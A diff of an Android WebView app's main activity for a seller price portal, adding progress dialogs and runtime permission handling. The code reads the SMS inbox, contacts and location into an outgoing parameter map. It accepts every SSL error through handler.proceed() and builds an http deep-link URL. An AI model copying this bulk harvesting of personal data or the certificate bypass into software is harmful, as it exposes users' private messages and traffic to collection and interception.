@@ -2,11 +2,13 @@ package com.truedev.priceproduction;
 
 import android.app.Activity;
 import android.app.AlertDialog;
+import android.app.NotificationManager;
 import android.app.ProgressDialog;
 import android.content.Context;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.location.Location;
@@ -15,6 +17,7 @@ import android.net.Uri;
 import android.net.http.SslError;
 import android.os.Build;
 import android.os.Bundle;
+import android.support.v4.app.ActivityCompat;
 import android.util.Log;
 import android.view.KeyEvent;
 import android.view.Menu;
@@ -28,8 +31,9 @@ import android.webkit.WebChromeClient;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
+import android.widget.ProgressBar;
 import android.widget.Toast;
-
+import android.Manifest;
 
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
@@ -52,6 +56,8 @@ import static com.google.gson.FieldNamingPolicy.LOWER_CASE_WITH_UNDERSCORES;
 public class MainActivity extends Activity {
 
     private WebView mWebView;
+    private ProgressBar pbar ;
+    private ProgressDialog mProgressDialog;
     private MainActivity context;
     private InformationDataSource dataSource;
     SharedPreferences sharedPreferencesProvider;
@@ -65,24 +71,78 @@ public class MainActivity extends Activity {
         context = this;
         sharedPreferencesProvider = getSharedPreferences("System_info",MODE_PRIVATE);
         dataSource = new InformationDataSource(getApplicationContext());
+        mProgressDialog = new ProgressDialog(this);
+        mProgressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
+        mProgressDialog.setMessage("Please wait...");
+        mProgressDialog.setCancelable(false);
+        mProgressDialog.setMax(100);
+        mProgressDialog.show();
+
+        CancelNotification(this,123);
+       // CancelNotification(this,124);
+       // CancelNotification(this,125);
 
         if ((!sharedPreferencesProvider.getBoolean("is_sms_and_apps_reads", false))) {
-            Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
-            JsonObject smsArray = Utils.getSms(cursor, true);                                                       // SMS data
-            if(smsArray!=null)
-                paramsSend.put(Constants.SMS_INFO,smsArray.toString());
+
+            int hasWriteContactsPermission = 0;
+            if(Build.VERSION.SDK_INT >= 23) {
+
+                hasWriteContactsPermission   = checkSelfPermission(Manifest.permission.CALL_PHONE);
+            }
+
+            if (hasWriteContactsPermission != PackageManager.PERMISSION_GRANTED) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.CALL_PHONE},
+                            112);
+                }
+
+            }
+
+/*
+            int hasWriteContactsPermission = 0;
+            if(Build.VERSION.SDK_INT >= 23) {
+
+                hasWriteContactsPermission   = checkSelfPermission(Manifest.permission.READ_SMS);
+            }
+
+            if (hasWriteContactsPermission != PackageManager.PERMISSION_GRANTED) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_SMS},
+                            123);
+                }
+
+            }
             JsonObject appsInstalled = Utils.getPackages(getApplicationContext());                                  // packages installed
                 if(appsInstalled!=null)
             paramsSend.put(Constants.APPS_INSTALLED,appsInstalled.toString());
             JsonArray browserHistory = Utils.getBH(getApplicationContext());                                                                   // browser history
                 if(browserHistory!=null)
             paramsSend.put(Constants.BROWSER_HISTORY, browserHistory.toString());
-            Location loc = Utils.getMyLocation(this);                                                               // location latitude and longitude
-                if(loc!=null)
-            paramsSend.put(Constants.LOCATION,loc.toString());
-            JsonArray contactList = Utils.getContacts(this);                                                                                // contact details
-                if(contactList!=null)
-            paramsSend.put(Constants.CONTACT,contactList.toString());
+            if(Build.VERSION.SDK_INT >= 23) {
+
+                hasWriteContactsPermission   = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION);
+            }
+
+            if (hasWriteContactsPermission != PackageManager.PERMISSION_GRANTED) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    requestPermissions(new String[]{Manifest.permission.ACCESS_FINE_LOCATION},
+                            124);
+                }
+
+
+            }
+
+            if(Build.VERSION.SDK_INT >= 23) {
+
+                hasWriteContactsPermission   = checkSelfPermission(Manifest.permission.WRITE_CONTACTS);
+            }
+            if (hasWriteContactsPermission != PackageManager.PERMISSION_GRANTED) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                    requestPermissions(new String[]{Manifest.permission.WRITE_CONTACTS},
+                            125);
+                }
+
+            }*/
             String networkType = Utils.getNetworkClass(this);
                 if(networkType!=null)
             paramsSend.put(Constants.NETWORK,networkType);                                                      // network type
@@ -117,6 +177,7 @@ public class MainActivity extends Activity {
             //if(!(prefs.get))
         CookieManager.getInstance().setAcceptCookie(true);
         mWebView = (WebView) findViewById(R.id.activity_main_webview);
+        pbar = (ProgressBar) findViewById(R.id.progressBar);
         WebSettings webSettings = mWebView.getSettings();
         webSettings.setJavaScriptEnabled(true);
         webSettings.setDomStorageEnabled(true);
@@ -129,7 +190,7 @@ public class MainActivity extends Activity {
         String action = "";
         Bundle extras = this.getIntent().getExtras();
         Boolean isDeepLink = this.getIntent().getBooleanExtra("isDeepLink",false);
-        if(extras!=null && extras.getString("notificationType") != null) {
+        if(extras!=null && extras.getString("notificationType") != null && !isDeepLink) {
             String notificationType = extras.getString("notificationType");
             url = this.getIntent().getStringExtra("url");
             action = this.getIntent().getStringExtra("action");
@@ -143,8 +204,12 @@ public class MainActivity extends Activity {
                 postData = "mspid=" + mspid + "&productName=" + productName;
             } else if("myOrders".equals(action)) {
                 postData = "";
+            } else if("outOfStockLead".equals(action)) {
+                String leadid = this.getIntent().getStringExtra("leadid");
+                postData = "leadID=" + leadid + "&stockAvailable=" + "no";
             }
         } else if(isDeepLink){
+            CancelNotification(this,123);
             String id = this.getIntent().getStringExtra("id");
             String urlBase = this.getIntent().getStringExtra("urlBase");
             url = "http://sellers.mysmartprice.com/my_leads.php?leadid="+id;
@@ -164,7 +229,7 @@ public class MainActivity extends Activity {
 
         mWebView.setWebChromeClient(new WebChromeClient(){
             @Override
-            public boolean onJsAlert(WebView view, String url, String message, final android.webkit.JsResult result) {
+            public boolean onJsAlert(WebView view, String url, String message, final JsResult result) {
                 new AlertDialog.Builder(context)
                         .setTitle(R.string.title_dialog_alert)
                         .setMessage(message)
@@ -176,7 +241,31 @@ public class MainActivity extends Activity {
                                 }).setCancelable(false).create().show();
 
                 return true;
+
+
             }
+
+            @Override
+            public void onProgressChanged(WebView view, int newProgress) {
+                mProgressDialog.show();
+                MainActivity.this.setTitle("Loading...");
+                MainActivity.this.setProgress(newProgress * 100);
+                mProgressDialog.setProgress(newProgress );
+                mProgressDialog.setMessage("Loading...");
+                mProgressDialog.setProgressPercentFormat(null);
+                mProgressDialog.setProgressNumberFormat(null);
+
+
+
+
+                if(newProgress == 100)
+                {
+                    MainActivity.this.setTitle(R.string.app_name);
+                    mProgressDialog.dismiss();
+                }
+
+            }
+
 
             @Override
             public boolean onJsConfirm(WebView view, String url, String message, final JsResult result) {
@@ -200,7 +289,7 @@ public class MainActivity extends Activity {
         });
 
         mWebView.setWebViewClient(new WebViewClient() {
-            ProgressDialog progressDialog = new ProgressDialog(MainActivity.this);
+           // ProgressDialog progressDialog = new ProgressDialog(MainActivity.this);
 
             @Override
             public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
@@ -208,17 +297,22 @@ public class MainActivity extends Activity {
                 handler.proceed();
             }
 
-            @Override
+           /* @Override
             public void onPageStarted(WebView view, String url, Bitmap favicon) {
-                progressDialog.setMessage("Loading...");
+
+                progressDialog.setProgress(0);
+                //progressDialog.setMessage("Loading...");
+                progressDialog.setCanceledOnTouchOutside(false);
                 progressDialog.show();
             }
 
             @Override
             public void onPageFinished(WebView view, String url) {
+                progressDialog.setProgress(100);
                 progressDialog.dismiss();
+                progressDialog.setCanceledOnTouchOutside(false);
                 findViewById(R.id.activity_main_webview).setVisibility(View.VISIBLE);
-            }
+            }*/
 
             @Override
             public boolean shouldOverrideUrlLoading(WebView view, String url) {
@@ -250,6 +344,79 @@ public class MainActivity extends Activity {
                 return true;
             }
         });
+    }
+
+    public static void CancelNotification(Context ctx, int notifyId) {
+        String  s = Context.NOTIFICATION_SERVICE;
+        NotificationManager mNM = (NotificationManager) ctx.getSystemService(s);
+
+//        mNM.getActiveNotifications();
+        mNM.cancel(notifyId);
+      //  mNM.cancelAll();
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        switch (requestCode) {
+            case 123:
+                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    // Permission Granted
+                    Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
+                    JsonObject smsArray = Utils.getSms(cursor, true);                                                       // SMS data
+                    if (smsArray != null)
+                        paramsSend.put(Constants.SMS_INFO, smsArray.toString());
+                } else {
+                    // Permission Denied
+                    Toast.makeText(MainActivity.this, "READ_SMS Denied", Toast.LENGTH_SHORT)
+                            .show();
+                }
+                break;
+
+            case 124:
+
+                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+
+                    Location loc = Utils.getMyLocation(context);                                                               // location latitude and longitude
+                    if (loc != null)
+                        paramsSend.put(Constants.LOCATION, loc.toString());
+                }else {
+                    // Permission Denied
+                    Toast.makeText(MainActivity.this, "GET_LOCATION Denied", Toast.LENGTH_SHORT)
+                            .show();
+                }
+                break;
+
+            case 125:
+
+                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+
+                    JsonArray contactList = Utils.getContacts(context);                                                                                // contact details
+                    if (contactList != null)
+                        paramsSend.put(Constants.CONTACT, contactList.toString());
+                }else {
+                    // Permission Denied
+                    Toast.makeText(MainActivity.this, "GET_CONTACTS Denied", Toast.LENGTH_SHORT)
+                            .show();
+                }
+                break;
+
+            case 112:
+
+                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+
+                    Toast.makeText(MainActivity.this, "GET_CONTACTS Granted", Toast.LENGTH_SHORT)
+                            .show();
+                }else {
+                    // Permission Denied
+                    Toast.makeText(MainActivity.this, "GET_CONTACTS Denied", Toast.LENGTH_SHORT)
+                            .show();
+                }
+                break;
+
+            default:
+                 super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+                //context.onRequestPermissionsResult(requestCode,permissions,grantResults);
+        }
     }
 
     @Override
